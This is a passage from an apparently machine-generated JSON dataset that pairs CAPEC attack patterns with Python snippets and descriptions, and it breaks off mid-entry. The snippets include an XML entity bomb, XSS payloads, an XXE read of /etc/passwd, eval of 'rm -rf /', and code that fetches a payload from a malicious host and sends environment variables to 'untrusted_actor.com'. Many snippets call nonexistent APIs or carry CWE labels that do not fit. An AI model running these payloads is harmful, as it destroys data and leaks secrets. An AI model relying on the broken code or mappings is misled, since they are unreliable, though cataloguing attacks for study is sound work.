        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml(xml_string):\n    try:\n        ET.fromstring(xml_string)\n    except ET.ParseError as e:\n        print(f'Error parsing XML: {e}')\n\nxml_string = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY a \"&b;&b;&b;&b;&b;\">\n  <!ENTITY b \"&c;&c;&c;&c;&c;\">\n  <!ENTITY c \"&d;&d;&d;&d;&d;\">\n  <!ENTITY d \"&e;&e;&e;&e;&e;\">\n  <!ENTITY e \"&f;&f;&f;&f;&f;\">\n  <!ENTITY f \"&g;&g;&g;&g;&g;\">\n  <!ENTITY g \"&h;&h;&h;&h;&h;\">\n  <!ENTITY h \"&i;&i;&i;&i;&i;\">\n  <!ENTITY i \"&j;&j;&j;&j;&j;\">\n  <!ENTITY j \"&k;&k;&k;&k;&k;\">\n  <!ENTITY k \"&l;&l;&l;&l;&l;\">\n  <!ENTITY l \"&m;&m;&m;&m;&m;\">\n  <!ENTITY m \"&n;&n;&n;&n;&n;\">\n  <!ENTITY n \"&o;&o;&o;&o;&o;\">\n  <!ENTITY o \"&p;&p;&p;&p;&p;\">\n  <!ENTITY p \"&q;&q;&q;&q;&q;\">\n  <!ENTITY q \"&r;&r;&r;&r;&r;\">\n  <!ENTITY r \"&s;&s;&s;&s;&s;\">\n  <!ENTITY s \"&t;&t;&t;&t;&t;\">\n  <!ENTITY t \"&u;&u;&u;&u;&u;\">\n  <!ENTITY u \"&v;&v;&v;&v;&v;\">\n  <!ENTITY v \"&w;&w;&w;&w;&w;\">\n  <!ENTITY w \"&x;&x;&x;&x;&x;\">\n  <!ENTITY x \"&y;&y;&y;&y;&y;\">\n  <!ENTITY y \"&z;&z;&z;&z;&z;\">\n  <!ENTITY z \"\">\n]\n<foo>&a;</foo>'''\n\nparse_xml(xml_string)",
        "description": "This code snippet demonstrates the CAPEC of nested exponential data expansion, which can lead to excessive demands on CPU and memory. The XML string contains a large number of recursive entity references, which can cause the parser to consume excessive resources. The CWEs related to this CAPEC include CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-776 (Improper Restriction of Recursive Entity References in DTDs), CWE-1102 (Reliance on Machine-Dependent Data Representation), CWE-1093 (Excessively Complex Data Representation), and CWE-1043 (Data Element Aggregating an Excessively Large Number of Non-Primitive Elements)."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.errorhandler(404)\ndef page_not_found(e):\n    return '<h1>Page Not Found</h1><p>The requested URL was not found on the server. The URL you entered was: <script>alert(\"XSS\")</script>' + flask.request.url + '</p>', 404\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)\n",
        "description": "This Python code snippet demonstrates a vulnerable Flask web application that is susceptible to Cross-Site Scripting (XSS) attacks. When a user requests a non-existent URL, the application returns a 404 error page that includes the requested URL. However, the application does not properly sanitize the URL, allowing an attacker to inject malicious script code. In this example, the script code is a simple alert box, but in a real-world scenario, an attacker could inject more malicious code to steal user data or take control of the user's session."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "import re\n\ndef filter_script_tags(html_input):\n    # Incomplete denylist-based protection mechanism\n    forbidden_tags = ['script']\n    for tag in forbidden_tags:\n        if re.search(tag, html_input, re.IGNORECASE):\n            return 'Forbidden tag detected'\n    return 'HTML input is safe'\n\n# Example usage\nhtml_input = '<ScRiPt>alert(\"XSS\")</ScRiPt>'\nprint(filter_script_tags(html_input))",
        "description": "This code snippet demonstrates a vulnerable filter function that attempts to detect and block 'script' tags in HTML input. However, it uses a case-insensitive search and only checks for the exact string 'script', making it vulnerable to alternate syntax attacks. An attacker can bypass the filter by using different case structures, such as 'ScRiPt', to inject malicious script tags."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "import os\n\ndef unsafe_eval(user_input):\n    # CWE-20: No input validation\n    # CWE-184: Incomplete list of disallowed inputs\n    # CWE-74: Improper neutralization of special elements in output\n    # CWE-182: Collapse of data into unsafe value\n    # CWE-707: Improper neutralization\n    try:\n        # Remove filtering mechanisms\n        user_input = user_input.replace(';', '')\n        # Evaluate user input as Python code\n        result = eval(user_input)\n        return result\n    except Exception as e:\n        return str(e)\n\n# Example usage\nuser_input = 'os.system(\"rm -rf /\")'\nprint(unsafe_eval(user_input))",
        "description": "This code snippet demonstrates the CAPEC of removing or disabling filtering mechanisms on the target application. The `unsafe_eval` function takes user input and evaluates it as Python code using the `eval` function, without any input validation or sanitization. This allows an attacker to inject malicious code, such as the example usage that deletes all files on the system. The code embodies the CWEs of improper input validation, incomplete list of disallowed inputs, improper neutralization of special elements in output, collapse of data into unsafe value, and improper neutralization."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nclass SerializableClass:\n    def __init__(self, data):\n        self.data = data\n\n    def serialize(self):\n        return ET.tostring(self.data, encoding='unicode')\n\n    @staticmethod\n    def deserialize(xml_string):\n        return ET.fromstring(xml_string)\n\n# CWE-611: Improper Restriction of XML External Entity Reference\n# CWE-502: Deserialization of Untrusted Data\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-1070: Serializable Data Element Containing non-Serializable Item Elements\n# CWE-499: Serializable Class Containing Sensitive Data\n\n# Create a malicious XML string with an external entity reference\nxml_string = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<foo>&xxe;</foo>'''\n\n# Deserialize the malicious XML string\nserialized_class = SerializableClass.deserialize(xml_string)\n\n# Print the contents of the deserialized object\nprint(serialized_class.data.text)",
        "description": "This code snippet demonstrates the CAPEC of creating a malicious serialized data file with an external data reference. The code defines a SerializableClass that can be serialized and deserialized using XML. The deserialize method uses the ElementTree library to parse the XML string, which can lead to the inclusion of functionality from an untrusted control sphere (CWE-829). The code then creates a malicious XML string with an external entity reference to the /etc/passwd file, which can allow an adversary to access sensitive information on the system. The deserialize method is then used to deserialize the malicious XML string, which can lead to the deserialization of untrusted data (CWE-502) and the inclusion of non-serializable item elements (CWE-1070). The SerializableClass also contains sensitive data, but does not explicitly deny serialization, which can lead to the serialization of sensitive data (CWE-499)."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "import socket\n\nclass MaliciousClient:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.socket.connect((self.host, self.port))\n\n    def send_malicious_data(self, data):\n        # CWE-506: Embedded Malicious Code\n        malicious_code = b'\\x90\\x90\\x90\\x90'  # embedded malicious code\n        self.socket.sendall(data + malicious_code)\n\n    def bypass_authentication(self):\n        # CWE-603: Use of Client-Side Authentication\n        # bypass server-side authentication by not sending authentication credentials\n        self.socket.sendall(b'fake_request')\n\n    def create_emergent_resource(self):\n        # CWE-1229: Creation of Emergent Resource\n        # create a new resource that can be used by attackers\n        self.socket.sendall(b'create_new_resource')\n\n    def trojan_horse(self):\n        # CWE-507: Trojan Horse\n        # send benign data with hidden malicious code\n        benign_data = b'benign_data'\n        malicious_code = b'\\x90\\x90\\x90\\x90'  # hidden malicious code\n        self.socket.sendall(benign_data + malicious_code)\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# the server relies on the client to implement a mechanism that is intended to protect the server\nmalicious_client = MaliciousClient('localhost', 8080)\nmalicious_client.send_malicious_data(b'malicious_data')\nmalicious_client.bypass_authentication()\nmalicious_client.create_emergent_resource()\nmalicious_client.trojan_horse()",
        "description": "A malicious client that violates assumptions made by a target service, exploiting CWE-602, CWE-506, CWE-603, CWE-1229, and CWE-507."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "import winreg\n\ndef modify_registry():\n    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\\\MyApp', 0, winreg.KEY_SET_VALUE)\n    winreg.SetValueEx(key, 'MySetting', 0, winreg.REG_SZ, 'NewValue')\n    winreg.CloseKey(key)\n\n# CWE-15: External Control of System or Configuration Setting\n# CWE-314: Cleartext Storage in the Registry\n# CWE-1231: Improper Prevention of Lock Bit Modification\n# CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\n# CWE-649: Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking\n\ndef main():\n    modify_registry()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the CAPEC pattern of exploiting a weakness in authorization to modify content within a registry. The code uses the winreg module to access and modify a registry key, illustrating the CWEs of external control of system settings, cleartext storage in the registry, and improper prevention of lock bit modification. The code also implies the CWEs of exposure of sensitive information and reliance on obfuscation or encryption without integrity checking, as it does not implement proper access controls or encryption for the registry data."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "import requests\n\ncache = {}\n\ndef fetch_data(username, password):\n    if (username, password) not in cache:\n        response = requests.get('https://example.com/api/data', auth=(username, password))\n        cache[(username, password)] = response.json()\n    return cache[(username, password)]\n\n# Example usage:\nfetch_data('user1', 'password1')\nfetch_data('user2', 'password2')",
        "description": "This Python code snippet demonstrates the CAPEC of examining a target application's cache for sensitive information. The code uses a cache to store sensitive data (username and password) in plaintext, which can be accessed by an attacker. This is an example of CWE-524: Use of Cache Containing Sensitive Information, CWE-311: Missing Encryption of Sensitive Data, and CWE-525: Use of Web Browser Cache Containing Sensitive Information."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "import requests\n\ndef authenticate(username, password):\n    # CWE-522: Insufficiently Protected Credentials\n    # Credentials are sent in plain text\n    auth_request = requests.post('https://example.com/auth', data={'username': username, 'password': password})\n    if auth_request.status_code == 200:\n        return True\n    else:\n        return False\n\n# CWE-294: Authentication Bypass by Capture-replay\n# Malicious user can sniff network traffic and replay it to bypass authentication\n\ndef capture_replay_authenticate(captured_request):\n    # Replay the captured request to the server\n    replay_request = requests.post('https://example.com/auth', data=captured_request)\n    if replay_request.status_code == 200:\n        return True\n    else:\n        return False\n\n# CWE-603: Use of Client-Side Authentication\n# Client-side authentication can be bypassed by modifying the client code\n\ndef client_side_authenticate(username, password):\n    # Perform authentication on the client-side\n    if username == 'admin' and password == 'password':\n        return True\n    else:\n        return False\n",
        "description": "This code snippet demonstrates the CAPEC pattern of retrieving embedded sensitive data, which is a deprecated pattern. It includes examples of CWE-522 (insufficiently protected credentials), CWE-294 (authentication bypass by capture-replay), and CWE-603 (use of client-side authentication). The code shows how credentials are sent in plain text, how authentication can be bypassed by capturing and replaying network traffic, and how client-side authentication can be bypassed by modifying the client code."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "import os\nimport hashlib\nimport cryptography\n\n# CWE-798: Hard-coded credentials\nprivate_key = \"-----BEGIN RSA PRIVATE KEY-----\\nProc-Type: 4,ENCRYPTED\\nDEK-Info: AES-256-CBC,random bytes\\n-----END RSA PRIVATE KEY-----\"\n\n# CWE-732: Incorrect permission assignment\nos.chmod(\"/path/to/private/key\", 0o777)\n\n# CWE-494: Download of code without integrity check\nmalicious_code = requests.get(\"http://malicious-website.com/malicious_code.py\").text\n\n# CWE-603: Use of client-side authentication\ndef authenticate():\n    return True\n\n# CWE-506: Embedded malicious code\nmalicious_code += \"print('Malicious code executed!')\"\n\n# CAPEC: Extracting credentials for code signing\nwith open(\"/path/to/private/key\", \"r\") as f:\n    private_key = f.read()\n\n# Signing malicious code with extracted credentials\nsignature = hashlib.sha256(malicious_code.encode()).digest()\nsigned_code = cryptography.sign(signature, private_key)\n\n# Distributing signed malicious code\nwith open(\"malicious_code_signed.py\", \"w\") as f:\n    f.write(signed_code.decode())",
        "description": "This code snippet demonstrates the CAPEC of extracting credentials for code signing and using them to sign malicious code. It includes CWEs such as hard-coded credentials, incorrect permission assignment, download of code without integrity check, use of client-side authentication, and embedded malicious code. The code extracts a private key from a file, downloads malicious code from a remote location, signs the code with the extracted credentials, and distributes the signed code."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "import hashlib\n\n# Server-side code\n\ndef authenticate(username, password):\n    if username == 'admin' and password == 'password':\n        return True\n    else:\n        return False\n\n# Client-side code\n\ndef client_authenticate(username, password):\n    # CWE-603: Client-side authentication\n    if username == 'admin' and password == 'password':\n        return True\n    else:\n        return False\n\n# CWE-602: Client-side enforcement of server-side security\n\ndef check_permissions(username):\n    if username == 'admin':\n        return True\n    else:\n        return False\n\n# CWE-807: Reliance on untrusted inputs in a security decision\n\ndef check_input(input):\n    if input == 'allow':\n        return True\n    else:\n        return False\n\n# CWE-829: Inclusion of functionality from untrusted control sphere\n\ndef download_code(url):\n    import requests\n    code = requests.get(url).text\n    exec(code)\n\n# CWE-494: Download of code without integrity check\n\ndef download_and_execute_code(url):\n    import requests\n    code = requests.get(url).text\n    exec(code)\n",
        "description": "This code snippet demonstrates the CAPEC of removing or disabling functionality on the client that the server assumes to be present and trustworthy. It includes multiple CWEs, including CWE-602 (client-side enforcement of server-side security), CWE-603 (use of client-side authentication), CWE-807 (reliance on untrusted inputs in a security decision), CWE-829 (inclusion of functionality from untrusted control sphere), and CWE-494 (download of code without integrity check). The code shows how an adversary can bypass server-side security checks by modifying the client-side code."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "import json\n\ndef calculate_total_cost(price, quantity):\n    # CWE-682: Incorrect Calculation\n    # CWE-1284: Improper Validation of Specified Quantity in Input\n    if quantity < 0:\n        quantity = 1\n    total_cost = price * quantity\n    return total_cost\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\n# CWE-115: Misinterpretation of Input\ncookie = {'user_id': '123', 'item_price': 10.99, 'item_quantity': 5}\n\nprice = cookie['item_price']\nquantity = cookie['item_quantity']\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-115: Misinterpretation of Input\nif 'admin' in cookie:\n    quantity = 1\n    price = 0.01\n\ntotal_cost = calculate_total_cost(price, quantity)\nprint(json.dumps({'total_cost': total_cost}))",
        "description": "This Python code snippet demonstrates the CAPEC where an attacker modifies the client-side logic for monetary calculations, resulting in incorrect information being sent to the server. The code includes CWE-602, CWE-682, CWE-1284, CWE-784, and CWE-115 vulnerabilities."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "import os\n\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\nfile_name = 'exploit.jpg'\nfile_content = '<script>alert(\"XSS\");</script>'\n\n# CWE-20: Improper Input Validation\nif file_name.endswith('.jpg'):\n    with open(file_name, 'w') as f:\n        f.write(file_content)\n\n# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n# CWE-82: Improper Neutralization of Script in Attributes of IMG Tags in a Web Page\n# CWE-84: Improper Neutralization of Encoded URI Schemes in a Web Page\n\n# Serve the file with a MIME type that doesn't match the content type\nos.system('python -m http.server 8000 &')\n\nprint('Exploit server started. Access http://localhost:8000/' + file_name + ' to trigger the XSS vulnerability.')",
        "description": "This code snippet demonstrates a vulnerability to Cross-Site Scripting (XSS) by creating a file with a .jpg extension but containing script content. The file is then served by a simple HTTP server with a MIME type that doesn't match the content type, potentially tricking the browser into executing the script."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/image', methods=['GET'])\ndef get_image():\n    img_url = flask.request.args.get('url')\n    return '<img src=\"' + img_url + '\" />'\n\nif __name__ == '__main__':\n    app.run()\n",
        "description": "This code snippet demonstrates a vulnerable Flask web application that is susceptible to Cross-Site Scripting (XSS) attacks due to incomplete denylist-based protection mechanism. The application takes a URL as input and embeds it in an IMG tag without proper sanitization, allowing an attacker to inject malicious script. This code relates to CWE-692, CWE-79, and CWE-82."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-1242: Inclusion of Undocumented Features or Chicken Bits\nundocumented_feature = os.popen('cat /proc/cpuinfo').read()\nprint(undocumented_feature)\n\n# CWE-1246: Improper Write Handling in Limited-write Non-Volatile Memories\nflash_memory = ctypes.CDLL(None).flash_write\nflash_memory(0x1000, b'malicious_data')\n\n# CWE-1281: Sequence of Processor Instructions Leads to Unexpected Behavior\nassembly_code = b'\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90'  # NOP instructions\nctypes.memset(0x1000, assembly_code, len(assembly_code))\n\n# CWE-695: Use of Low-Level Functionality\nlow_level_function = ctypes.CDLL(None).ioctl\nlow_level_function(0, 0, 0)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.popen('cat /sys/kernel/debug/tracing/trace').read()\nprint(sensitive_info)",
        "description": "This Python code snippet demonstrates the CAPEC of leveraging a legitimate capability of an application in a way that achieves a negative technical impact. It includes undocumented features, improper write handling, sequence of processor instructions leading to unexpected behavior, use of low-level functionality, and exposure of sensitive system information to an unauthorized control sphere."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "import os\n\ndef get_file(user_input):\n    file_path = os.path.join('/var/www/files', user_input)\n    if os.path.isfile(file_path):\n        return open(file_path, 'r').read()\n    else:\n        return 'File not found'\n\nuser_input = '../etc/passwd'\nprint(get_file(user_input))",
        "description": "This Python code snippet demonstrates a path traversal vulnerability. The `get_file` function takes user input to construct a file path, but it does not properly sanitize the input. An attacker can provide a malicious input like `../etc/passwd` to access sensitive files outside of the restricted directory."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "import socket\nimport java\n\n# Direct use of sockets (CWE-246)\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('localhost', 8080))\n\n# Missing custom error page (CWE-7)\ntry:\n    # Struts plug-in framework not in use (CWE-106)\n    # No input validation\n    user_input = input('Enter your name: ')\n    print('Hello, ' + user_input)\nexcept Exception as e:\n    # Information exposure through debug log files (CWE-534)\n    print('Error: ' + str(e))\n\n# Use of dynamic class loading (CWE-545)\njava.lang.Runtime.getRuntime().load('MyDynamicClass')",
        "description": "This Python code snippet demonstrates a deprecated CAPEC pattern that has been merged into CAPEC-215. It includes various CWEs, such as direct use of sockets, missing custom error page, Struts plug-in framework not in use, information exposure through debug log files, and use of dynamic class loading. These weaknesses can lead to insufficient input validation, information exposure, and other security vulnerabilities."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "import logging\n\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\ndef process_message(message):\n    try:\n        # Process the message\n        if message['action'] == 'login':\n            # Perform login logic\n            login_user(message['username'], message['password'])\n        elif message['action'] == 'transfer':\n            # Perform transfer logic\n            transfer_funds(message['from_account'], message['to_account'], message['amount'])\n        else:\n            # Log error with sensitive information\n            logging.error(f'Unknown action: {message}. User: {get_current_user()}')\n    except Exception as e:\n        # Log error with sensitive information\n        logging.error(f'Error processing message: {message}. Error: {str(e)}')\n\n# Fuzzing attack simulation\nfor i in range(1000):\n    message = {'action': 'login', 'username': f'user{i}', 'password': f'password{i}'}\n    process_message(message)\n    message = {'action': 'transfer', 'from_account': f'account{i}', 'to_account': f'account{i+1}', 'amount': i}\n    process_message(message)\n    message = {'action': 'unknown', 'data': f'data{i}'}\n    process_message(message)",
        "description": "This code snippet demonstrates a Python application that processes messages and logs error messages with sensitive information. The process_message function tries to process the message based on the action specified, and if it encounters an unknown action or an exception, it logs an error message with sensitive information such as the current user. The code then simulates a fuzzing attack by sending a large number of random messages to the process_message function, which can potentially trigger desired behavior or cause the application to crash."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "import socket\n\ndef send_message(message):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_address = ('localhost', 12345)\n    sock.connect(server_address)\n    sock.sendall(message.encode())\n    sock.close()\n\n# No authentication or verification of the source of the message\nsend_message('Hello, I am an attacker!')\n\n# No integrity check of the message during transmission\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_address = ('localhost', 12345)\nsock.connect(server_address)\ndata = sock.recv(1024)\nprint('Received message:', data.decode())\n\n# No verification of the identity of actors at both ends of the communication channel\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_address = ('localhost', 12345)\nsock.connect(server_address)\ndata = 'Malicious data'\nsock.sendall(data.encode())",
        "description": "This code snippet demonstrates the CAPEC of manipulating a setting or parameter on a communications channel to compromise its security. It lacks authentication for critical functions (CWE-306), does not ensure message integrity during transmission (CWE-924), does not properly verify the source of the communication channel (CWE-940), and allows access to the channel by non-endpoint actors (CWE-300). This creates a covert channel (CWE-514) for an attacker to send malicious data."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "import socket\nimport ssl\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-940: Improper Verification of Source of a Communication Channel\n\ndef send_data_over_insecure_channel(data):\n    # Establish an insecure SSL/TLS connection\n    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)\n    context.check_hostname = False\n    context.verify_mode = ssl.CERT_NONE\n\n    # CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    # Connect to a potentially malicious server\n    with socket.create_connection(('malicious-server.com', 443)) as sock:\n        with context.wrap_socket(sock, server_hostname='malicious-server.com') as ssock:\n            # CWE-201: Insertion of Sensitive Information Into Sent Data\n            # Send sensitive data over the insecure channel\n            ssock.sendall(b'username=password')\n\n            # CWE-294: Authentication Bypass by Capture-replay\n            # CWE-940: Improper Verification of Source of a Communication Channel\n            # Receive and process data from the server without proper verification\n            data = ssock.recv(1024)\n            process_data(data)\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# Rely on the client to implement security mechanisms\nsend_data_over_insecure_channel('username=password')",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting incorrectly configured SSL/TLS communications. It establishes an insecure SSL/TLS connection, sends sensitive data over the channel, and receives and processes data from the server without proper verification. The code embodies CWE-201, CWE-294, CWE-602, CWE-923, and CWE-940."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport soapclient\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-112: Missing XML Validation\n\ndef spoof_uddi_message():\n    # Create a SOAP client without verifying the authenticity of the WSDL\n    client = soapclient.SOAPClient('http://example.com/legitimate_business.wsdl')\n\n    # Create a malicious UDDI message with tampered WSDL information\n    root = ET.Element('uddi:businessEntity')\n    root.set('businessKey', 'malicious_business_key')\n    wsdl_info = ET.SubElement(root, 'uddi:wsdlInfo')\n    wsdl_info.text = 'http://example.com/malicious_wsdl.wsdl'\n\n    # Send the tampered UDDI message without verifying the destination\n    client.send(ET.tostring(root, encoding='unicode'))\n\nspoof_uddi_message()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a UDDI message sender. It creates a SOAP client without verifying the authenticity of the WSDL, constructs a malicious UDDI message with tampered WSDL information, and sends the message without verifying the destination. This code is vulnerable to multiple CWEs, including Insufficient Verification of Data Authenticity, Incorrectly Specified Destination in a Communication Channel, Improper Enforcement of Message Integrity During Transmission in a Communication Channel, Channel Accessible by Non-Endpoint, and Missing XML Validation."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport requests\n\n# CWE-112: Missing XML Validation\nxml_data = '<root><node>untrusted_data</node></root>'\nxml_root = ET.fromstring(xml_data)\n\n# CWE-611: Improper Restriction of XML External Entity Reference\nxml_entity = ET.Entity('http://example.com/malicious_entity')\nxml_root.append(xml_entity)\n\n# CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')\nxpath_expr = \"//node[\" + input('Enter XPath filter: ') + \"]\"\nresult = xml_root.findall(xpath_expr)\n\n# CWE-610: Externally Controlled Reference to a Resource in Another Sphere\nexternal_resource = 'http://example.com/malicious_resource'\nresponse = requests.get(external_resource)\n\n# CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\nproxy_url = 'http://example.com/proxy'\nrequests.post(proxy_url, data={'xml_data': ET.tostring(xml_root, encoding='unicode')})",
        "description": "This Python code snippet demonstrates an XML Routing Detour Attack (CAPEC-94) by exploiting multiple CWEs. It lacks XML validation, allowing untrusted data to be processed. It also uses an externally controlled XML entity, is vulnerable to XPath injection, and makes an externally controlled reference to a resource. Finally, it acts as an unintended proxy or intermediary, forwarding the modified XML data to an external actor."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-246: Direct use of sockets\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# CWE-602: Client-side enforcement of server-side security\n# The client is responsible for encrypting the data, but it can be tampered with\nencrypted_data = hashlib.sha256(b'hello').hexdigest()\n\n# CWE-294: Authentication bypass by capture-replay\n# The server does not verify the authenticity of the message\nsock.connect(('localhost', 8080))\nsock.sendall(b'hello')\n\n# CWE-941: Incorrectly specified destination in a communication channel\n# The server is not correctly specified, allowing an attacker to redirect the request\ndata = sock.recv(1024)\n\n# CWE-757: Selection of less-secure algorithm during negotiation\n# The client and server negotiate the encryption algorithm, but the client can downgrade the algorithm\nalgorithm = 'md5'\nif algorithm == 'md5':\n    encrypted_data = hashlib.md5(b'hello').hexdigest()\nelse:\n    encrypted_data = hashlib.sha256(b'hello').hexdigest()\n",
        "description": "This code snippet demonstrates a vulnerable communication protocol between a client and server. The client uses a socket to connect to the server, but the server relies on the client to implement encryption and authentication mechanisms. The client can tamper with the encrypted data, and the server does not verify the authenticity of the message. The client and server negotiate the encryption algorithm, but the client can downgrade the algorithm to a less secure one. Additionally, the server is not correctly specified, allowing an attacker to redirect the request."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef parse_xml(xml_string):\n    root = ET.fromstring(xml_string)\n    for elem in root.iter():\n        if elem.text and elem.text.startswith('http://'):\n            import requests\n            requests.get(elem.text)\n\nxml_string = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://example.com/malicious\"> ]><root><bar>&xxe;</bar></root>'''\nparse_xml(xml_string)",
        "description": "This Python code snippet demonstrates a denial of service vulnerability through XML entity expansion. The code parses an XML string that contains an external entity reference to a URI. When the XML parser encounters the entity reference, it sends an HTTP request to the specified URI, which can lead to a denial of service condition if the URI points to a resource that consumes a large amount of resources. This code embodies CWE-611 (Improper Restriction of XML External Entity Reference), CWE-99 (Improper Control of Resource Identifiers), and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File)."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/iframe_overlay_attack')\ndef iframe_overlay_attack():\n    return '<html><body><iframe src=\"https://attacker.com/malicious_page\" width=\"100%\" height=\"100%\"></iframe><script>document.body.innerHTML = \"<h1>Welcome to the legitimate website!</h1>\";</script></body></html>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This code snippet demonstrates an iFrame overlay attack. The Flask web application returns an HTML page with an iframe that loads a malicious page from the attacker's domain. The script tag is used to modify the content of the page, making it appear as if the user is interacting with the legitimate website. This attack exploits CWE-1021 (Improper Restriction of Rendered UI Layers or Frames), CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-451 (User Interface Misrepresentation of Critical Information), CWE-368 (Context Switching Race Condition), and CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page)."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "import socket\nimport platform\nimport os\n\ndef get_system_info():\n    return {\n        'os': platform.system(),\n        'os_version': platform.release(),\n        'architecture': platform.machine(),\n        'processor': platform.processor(),\n        'python_version': platform.python_version(),\n        'current_working_directory': os.getcwd(),\n        'environment_variables': dict(os.environ)\n    }\n\ndef send_system_info_to_untrusted_actor(system_info):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('untrusted_actor.com', 8080))\n    sock.sendall(str(system_info).encode())\n    sock.close()\n\nif __name__ == '__main__':\n    system_info = get_system_info()\n    send_system_info_to_untrusted_actor(system_info)",
